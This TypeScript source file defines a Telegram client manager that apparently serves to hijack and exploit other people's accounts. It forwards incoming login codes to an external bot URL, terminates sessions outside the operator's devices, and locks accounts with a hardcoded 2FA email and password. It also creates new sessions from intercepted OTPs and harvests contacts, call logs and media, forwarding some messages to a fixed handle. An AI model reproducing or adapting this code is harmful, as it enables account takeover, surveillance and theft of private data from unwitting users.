import { TelegramClient } from 'telegram';
import { StringSession } from 'telegram/sessions';
import { NewMessage, NewMessageEvent } from 'telegram/events';
import { Api } from 'telegram/tl';
import axios from 'axios';
import * as fs from 'fs';
import { CustomFile } from 'telegram/client/uploads';
import { contains, fetchWithTimeout, parseError, ppplbot } from '../../utils';
import { TotalList, sleep } from 'telegram/Helpers';
import { Dialog } from 'telegram/tl/custom/dialog';
import { LogLevel } from 'telegram/extensions/Logger';
import { MailReader } from '../../IMap/IMap';
import * as bigInt from 'big-integer';
import { IterDialogsParams } from 'telegram/client/dialogs';
import { EntityLike } from 'telegram/define';

class TelegramManager {
    private session: StringSession;
    public phoneNumber: string;
    private client: TelegramClient | null;
    private channelArray: string[];
    private static activeClientSetup: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string };

    constructor(sessionString: string, phoneNumber: string) {
        this.session = new StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.channelArray = [];
    }


    public static getActiveClientSetup() {
        return TelegramManager.activeClientSetup;
    }

    public static setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {
        TelegramManager.activeClientSetup = data;
    }

    async disconnect(): Promise<void> {
        if (this.client) {
            console.log("Destroying Client: ", this.phoneNumber)
            await this.client.destroy();
            this.client._destroyed = true
            await this.client.disconnect();
        }
        this.session.delete();
    }

    async getchatId(username: string): Promise<any> {
        if (!this.client) throw new Error('Client is not initialized');
        const entity = await this.client.getInputEntity(username);
        return entity;
    }

    async getMe() {
        const me = <Api.User>await this.client.getMe();
        return me
    }

    async errorHandler(error) {
        if (error.message && error.message == 'TIMEOUT') {
            //Do nothing, as this error does not make sense to appear while keeping the client disconnected
        } else {
            console.error(`Error occurred for API ID ${this.phoneNumber}:`, error);
            // Handle other types of errors
        }
    }

    async createClient(handler = true): Promise<TelegramClient> {
        this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
            connectionRetries: 5,
        });
        this.client.setLogLevel(LogLevel.ERROR);
        //this.client._errorHandler = this.errorHandler
        await this.client.connect();
        const me = <Api.User>await this.client.getMe();
        console.log("Connected Client : ", me.phone);
        if (handler && this.client) {
            console.log("Adding event Handler")
            this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new NewMessage());
        }
        return this.client
    }

    async getMessages(entityLike: Api.TypeEntityLike, limit: number = 8): Promise<TotalList<Api.Message>> {
        const messages = await this.client.getMessages(entityLike, { limit });
        return messages;
    }
    async getDialogs(params: IterDialogsParams): Promise<TotalList<Dialog>> {
        const chats = await this.client.getDialogs(params);
        console.log("TotalChats:", chats.total);
        return chats
    }

    async getLastMsgs(limit: number): Promise<string> {
        if (!this.client) throw new Error('Client is not initialized');
        const msgs = await this.client.getMessages("777000", { limit });
        let resp = '';
        msgs.forEach((msg) => {
            console.log(msg.text);
            resp += msg.text + "\n";
        });
        return resp;
    }

    async getSelfMSgsInfo(): Promise<{ photoCount: number; videoCount: number; movieCount: number, total: number }> {
        if (!this.client) throw new Error('Client is not initialized');
        const self = <Api.User>await this.client.getMe();
        const selfChatId = self.id;

        let photoCount = 0;
        let videoCount = 0;
        let movieCount = 0;

        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 });
        for (const message of messageHistory) {
            if (message.photo) {
                photoCount++;
            } else if (message.video) {
                videoCount++;
            }
            const text = message.text.toLocaleLowerCase();
            if (contains(text, ['movie', 'series', '1080', '720', '640', 'title', 'aac', '265', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                movieCount++;
            }
        }

        return { photoCount, videoCount, movieCount, total: messageHistory.total };
    }

    async channelInfo(sendIds = false): Promise<{ chatsArrayLength: number; canSendTrueCount: number; canSendFalseCount: number; ids: string[] }> {
        if (!this.client) throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 600 });
        let canSendTrueCount = 0;
        let canSendFalseCount = 0;
        let totalCount = 0;
        this.channelArray.length = 0;
        console.log("TotalChats:", chats.total);
        for (const chat of chats) {
            if (chat.isChannel || chat.isGroup) {
                try {
                    const chatEntity = <Api.Channel>chat.entity.toJSON();
                    const { broadcast, defaultBannedRights, id } = chatEntity;
                    totalCount++;
                    if (!broadcast && !defaultBannedRights?.sendMessages) {
                        canSendTrueCount++;
                        this.channelArray.push(id.toString()?.replace(/^-100/, ""));
                    } else {
                        canSendFalseCount++;
                    }
                } catch (error) {
                    parseError(error);
                }
            }
        };
        return {
            chatsArrayLength: totalCount,
            canSendTrueCount,
            canSendFalseCount,
            ids: sendIds ? this.channelArray : []
        };
    }

    async getEntity(entity: Api.TypeEntityLike) {
        return await this.client?.getEntity(entity)
    }

    async joinChannel(entity: Api.TypeEntityLike) {
        return await this.client?.invoke(
            new Api.channels.JoinChannel({
                channel: await this.client?.getEntity(entity)
            })
        );
    }

    connected() {
        return this.client.connected;
    }

    async connect() {
        return await this.client.connect();
    }


    async removeOtherAuths(): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        const result = await this.client.invoke(new Api.account.GetAuthorizations());
        const updatedAuthorizations = result.authorizations.map((auth) => {
            if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
                auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
                auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
                auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru')
                || auth.deviceModel.toLowerCase().includes('windows')) {
                return auth;
            } else {
                this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
                return null;
            }
        }).filter(Boolean);
        console.log(updatedAuthorizations);
    }

    async getAuths(): Promise<any> {
        if (!this.client) throw new Error('Client is not initialized');
        const result = await this.client.invoke(new Api.account.GetAuthorizations());
        return result;
    }

    async getAllChats(): Promise<any[]> {
        if (!this.client) throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 500 });
        console.log("TotalChats:", chats.total);
        const chatData = [];
        for (const chat of chats) {
            const chatEntity = await chat.entity.toJSON();
            chatData.push(chatEntity);
        }
        return chatData;
    }

    async getCallLog() {
        const result = <Api.messages.Messages>await this.client.invoke(
            new Api.messages.Search({
                peer: new Api.InputPeerEmpty(),
                q: '',
                filter: new Api.InputMessagesFilterPhoneCalls({}),
                minDate: 0,
                maxDate: 0,
                offsetId: 0,
                addOffset: 0,
                limit: 200,
                maxId: 0,
                minId: 0,
                hash: bigInt(0),
            })
        );

        const callLogs = <Api.Message[]>result.messages.filter(
            (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall
        );

        const filteredResults = {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: {},
            totalCalls: 0
        };
        for (const log of callLogs) {
            filteredResults.totalCalls++;
            const logAction = <Api.MessageActionPhoneCall>log.action

            const callInfo = {
                callId: logAction.callId.toString(),
                duration: logAction.duration,
                video: logAction.video,
                timestamp: log.date
            };

            // Categorize by type
            if (log.out) {
                filteredResults.outgoing++;
            } else {
                filteredResults.incoming++;
            }

            if (logAction.video) {
                filteredResults.video++;
            }

            // Count calls per chat ID
            const chatId = (log.peerId as Api.PeerUser).userId.toString();
            if (!filteredResults.chatCallCounts[chatId]) {
                const ent = <Api.User>await this.client.getEntity(chatId)
                filteredResults.chatCallCounts[chatId] = {
                    phone: ent.phone,
                    username: ent.username,
                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
                    count: 0
                };
            }
            filteredResults.chatCallCounts[chatId].count++;
        }
        const filteredChatCallCounts = Object.entries(filteredResults.chatCallCounts)
            .filter(([chatId, details]) => details["count"] > 5)
            .map(([chatId, details]) => ({
                ...(details as any),
                chatId,
            }));
        console.log({
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        });

        return {
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        };
    }

    async handleEvents(event: NewMessageEvent) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                console.log(event.message.text.toLowerCase());
                console.log("Login Code received for - ", this.phoneNumber, '\nActiveClientSetup - ', TelegramManager.activeClientSetup);
                console.log("Date :", new Date(event.message.date * 1000))
                // if (TelegramManager.activeClientSetup && this.phoneNumber === TelegramManager.activeClientSetup?.newMobile) {
                //     console.log("LoginText: ", event.message.text)
                //     const code = (event.message.text.split('.')[0].split("code:**")[1].trim())
                //     console.log("Code is:", code);
                //     try {
                //         await fetchWithTimeout(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);
                //         console.log("Code Sent back");
                //     } catch (error) {
                //         parseError(error)
                //     }
                // } else {
                await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(event.message.text)}`);
                // await event.message.delete({ revoke: true });
                // }
            }
        }
    }

    async updatePrivacyforDeletedAccount() {
        try {
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneCall(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Calls Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyProfilePhoto(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("PP Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneNumber(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Number Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyStatusTimestamp(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyAbout(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("LAstSeen Updated")
        }
        catch (e) {
            throw e
        }
    }
    async updateProfile(firstName: string, about: string) {
        const data = {
            lastName: "",
        }
        if (firstName !== undefined) {
            data["firstName"] = firstName
        }
        if (about !== undefined) {
            data["about"] = about
        }
        try {
            const result = await this.client.invoke(
                new Api.account.UpdateProfile(data)
            );
            console.log("Updated NAme: ", firstName);
        } catch (error) {
            throw error
        }
    }

    async getLastActiveTime() {
        const result = await this.client.invoke(new Api.account.GetAuthorizations());
        let latest = 0
        result.authorizations.map((auth) => {
            if (!auth.country.toLowerCase().includes('singapore') && !auth.deviceModel.includes("Windows")) {
                if (latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        });
        return (new Date(latest * 1000)).toISOString().split('T')[0];
    }

    async getContacts() {
        const exportedContacts = await this.client.invoke(new Api.contacts.GetContacts({
            hash: bigInt(0)
        }));
        return exportedContacts;
    }

    async getMediaMetadata(chatId: string = 'me', offset: number = undefined, limit = 100) {
        const query = {
            limit: parseInt(limit.toString())
        }
        if (offset) {
            console.log("Setting offset")
            query['offsetId'] = parseInt(offset.toString())
        }
        console.log("Query: ", query)

        const messages = await this.client.getMessages(chatId, query);
        const mediaMessages = messages.filter(message => message.media);
        console.log("Total:", messages.total, "fetched: ", messages, "ChatId: ", chatId, "Media :", mediaMessages.length);
        const data = []
        for (const message of mediaMessages) {
            console.log(message.media.className, message.document?.mimeType);
            let thumbBuffer = null;
            if (message.media instanceof Api.MessageMediaPhoto) {
                console.log("messageId image:", message.id)
                const sizes = (<Api.Photo>message.photo)?.sizes || [1];
                // await message.forwardTo('@fuckyoubabie')
                thumbBuffer = await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
                data.push({
                    messageId: message.id,
                    mediaType: 'photo',
                    thumb: thumbBuffer
                })
            } else if (message.media instanceof Api.MessageMediaDocument && (message.document.mimeType.startsWith('video') || message.document.mimeType.startsWith('image'))) {
                console.log("messageId video:", message.id)
                const sizes = message.document?.thumbs || [1]
                // await message.forwardTo('@fuckyoubabie')
                thumbBuffer = await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
                data.push({
                    messageId: message.id,
                    mediaType: 'video',
                    thumb: thumbBuffer
                })
            }
            // await sleep(2500)
        }
        console.log("Returning : ", data.length)
        // await this.deleteChat(bigInt(chatId))
        return data
    }

    async deleteChat(chatId: string) {
        try {
            await this.client.invoke(new Api.messages.DeleteHistory({
                justClear: false,
                peer: chatId,
                revoke: false,
            }));
            console.log(`Dialog with ID ${chatId} has been deleted.`);
        } catch (error) {
            console.error('Failed to delete dialog:', error);
        }
    }

    async downloadMediaFile(messageId: number, chatId: string = 'me', res: any) {
        try {
            await this.client.connect();
            const messages = await this.client.getMessages(chatId, { ids: [messageId] })
            const message = <Api.Message>messages[0]
            if (message && !(message.media instanceof Api.MessageMediaEmpty) && (message.video || <Api.Photo>message.photo)) {
                const media = message.media;
                let contentType;
                let filename;
                let fileLocation;
                const inputLocation = message.video || <Api.Photo>message.photo;
                const data = {
                    id: inputLocation.id,
                    accessHash: inputLocation.accessHash,
                    fileReference: inputLocation.fileReference,

                }
                if (media instanceof Api.MessageMediaPhoto) {
                    contentType = 'image/jpeg';
                    filename = 'photo.jpg'; // Replace with your logic
                    fileLocation = new Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });
                } else if (media instanceof Api.MessageMediaDocument) {
                    contentType = (media as any).mimeType || 'video/mp4'; // Use provided mimeType if available
                    filename = 'video.mp4'; // Replace with your logic
                    fileLocation = new Api.InputDocumentFileLocation({ ...data, thumbSize: '' })
                } else {
                    return res.status(415).send('Unsupported media type');
                }

                console.log("accessHash :", inputLocation.accessHash, "fileReference: ", inputLocation.fileReference);

                res.setHeader('Content-Type', contentType);
                res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);

                const chunkSize = 512 * 1024; // 1 MB chunks
                const end = 80 * 1024 * 1024; // 10 MB limit

                try {

                    for await (const chunk of this.client.iterDownload({
                        file: fileLocation,
                        offset: bigInt[0],
                        limit: end,
                        requestSize: chunkSize
                    })) {
                        res.write(chunk);
                    }
                    res.end(); // End the response when streaming is complete
                } catch (downloadError) {
                    console.log(message.video)
                    if (downloadError.message.includes('FILE_REFERENCE_EXPIRED')) {
                        console.warn('File reference expired. Attempting to re-fetch media...');
                        // Implement logic to re-fetch message or handle gracefully
                        return res.status(404).send('Media reference expired');
                    } else {
                        console.error(downloadError);
                        // Handle other download errors
                        return res.status(500).send('Error while streaming media');
                    }
                }

            } else {
                res.status(404).send('Media not found');
            }
        } catch (error) {
            console.error(error);
            res.status(500).send('Error while streaming media');
        }
    }

    async forwardMessage(chatId: string, messageId: number) {
        try {
            await this.client.forwardMessages("@fuckyoubabie", { fromPeer: chatId, messages: messageId })
        } catch (error) {
            console.log("Failed to Forward Message : ", error.errorMessage);
        }
    }

    async updateUsername(baseUsername) {
        let newUserName = ''
        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
        let increment = 0;
        if (username === '') {
            try {
                const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));
                console.log(`Removed Username successfully.`);
            } catch (error) {
                console.log(error)
            }
        } else {
            while (true) {
                try {
                    const result = await this.client.invoke(
                        new Api.account.CheckUsername({ username })
                    );
                    console.log(result, " - ", username)
                    if (result) {
                        const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));
                        console.log(`Username '${username}' updated successfully.`);
                        newUserName = username
                        break;
                    } else {
                        username = baseUsername + increment;
                        increment++;
                        await sleep(2000);
                    }
                } catch (error) {
                    console.log(error.message)
                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
                        newUserName = username;
                        break;
                    }
                    username = baseUsername + increment;
                    increment++;
                    await sleep(2000);
                }
            }
        }
        return newUserName;
    }

    async updatePrivacy() {
        try {
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneCall(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Calls Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyProfilePhoto(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("PP Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneNumber(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Number Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyStatusTimestamp(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("LAstSeen Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyAbout(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
        }
        catch (e) {
            throw e
        }
    }
    async getFileUrl(url: string, filename: string): Promise<string> {
        const response = await axios.get(url, { responseType: 'stream' });
        const filePath = `/tmp/${filename}`;
        await new Promise((resolve, reject) => {
            const writer = fs.createWriteStream(filePath);
            response.data.pipe(writer);
            writer.on('finish', resolve);
            writer.on('error', reject);
        });
        return filePath;
    }

    async updateProfilePic(image) {
        try {
            const file = await this.client.uploadFile({
                file: new CustomFile(
                    'pic.jpg',
                    fs.statSync(
                        image
                    ).size,
                    image
                ),
                workers: 1,
            });
            console.log("file uploaded")
            await this.client.invoke(new Api.photos.UploadProfilePhoto({
                file: file,
            }));
            console.log("profile pic updated")
        } catch (error) {
            throw error
        }
    }
    async hasPassword() {
        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());
        return passwordInfo.hasPassword
    }

    async set2fa() {
        if (!(await this.hasPassword())) {
            console.log("Password Does not exist, Setting 2FA");

            const imapService = MailReader.getInstance();
            const twoFaDetails = {
                email: "storeslaksmi@gmail.com",
                hint: "password - India143",
                newPassword: "Ajtdmwajt1@",
            };

            try {
                await imapService.connectToMail();
                const checkMailInterval = setInterval(async () => {
                    console.log("Checking if mail is ready");

                    if (imapService.isMailReady()) {
                        clearInterval(checkMailInterval);
                        console.log("Mail is ready, checking code!");
                        await this.client.updateTwoFaSettings({
                            isCheckPassword: false,
                            email: twoFaDetails.email,
                            hint: twoFaDetails.hint,
                            newPassword: twoFaDetails.newPassword,
                            emailCodeCallback: async (length) => {
                                console.log("Code sent");
                                return new Promise(async (resolve, reject) => {
                                    let retry = 0;
                                    const codeInterval = setInterval(async () => {
                                        try {
                                            console.log("Checking code");
                                            retry++;
                                            if (imapService.isMailReady() && retry < 4) {
                                                const code = await imapService.getCode();
                                                console.log('Code:', code);
                                                if (code) {
                                                    await imapService.disconnectFromMail();
                                                    clearInterval(codeInterval);
                                                    resolve(code);
                                                }
                                            } else {
                                                clearInterval(codeInterval);
                                                await imapService.disconnectFromMail();
                                                reject(new Error("Failed to retrieve code"));
                                            }
                                        } catch (error) {
                                            clearInterval(codeInterval);
                                            await imapService.disconnectFromMail();
                                            reject(error);
                                        }
                                    }, 10000);
                                });
                            },
                            onEmailCodeError: (e) => {
                                console.error('Email code error:', parseError(e));
                                return Promise.resolve("error");
                            }
                        });

                        return twoFaDetails;
                    } else {
                        console.log("Mail not ready yet");
                    }
                }, 5000);
            } catch (e) {
                console.error("Unable to connect to mail server:", parseError(e));
            }
        } else {
            console.log("Password already exists");
        }
    }


    async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }

    async sendFileChat(id: string, url: string, caption: string, filename: string): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }

    async deleteProfilePhotos() {
        try {
            const result = await this.client.invoke(
                new Api.photos.GetUserPhotos({
                    userId: "me"
                })
            );
            console.log(`Profile Pics found: ${result.photos.length}`)
            if (result && result.photos?.length > 0) {
                const res = await this.client.invoke(
                    new Api.photos.DeletePhotos({
                        id: <Api.TypeInputPhoto[]><unknown>result.photos
                    }))
            }
            console.log("Deleted profile Photos");
        } catch (error) {
            throw error
        }
    }

    async createNewSession(): Promise<string> {
        const me = <Api.User>await this.client.getMe();
        console.log("Phne:", me.phone);
        const newClient = new TelegramClient(new StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, {
            connectionRetries: 1,
        });
        await newClient.start({
            phoneNumber: me.phone,
            password: async () => "Ajtdmwajt1@",
            phoneCode: async () => {
                console.log('Waiting for the OTP code from chat ID 777000...');
                return await this.waitForOtp();
            },
            onError: (err: any) => { throw err },

        });

        const session = <string><unknown>newClient.session.save();
        await newClient.disconnect();
        await newClient.destroy();
        console.log("New Session: ", session)
        return session
    }

    async waitForOtp() {
        for (let i = 0; i < 3; i++) {
            try {
                console.log("Attempt : ", i)
                const messages = await this.client.getMessages('777000', { limit: 1 });
                const message = messages[0];
                if (message && message.date && message.date * 1000 > Date.now() - 60000) {
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    console.log("returning: ", code)
                    return code;
                } else {
                    console.log("Message Date: ", new Date(message.date * 1000).toISOString(), "Now: ", new Date(Date.now() - 60000).toISOString());
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    console.log("Skipped Code: ", code);
                    if (i == 2) {
                        return code;
                    }
                    await sleep(5000)
                }
            } catch (err) {
                await sleep(2000)
                console.log(err)
            }
        }
    }
}
export default TelegramManager;
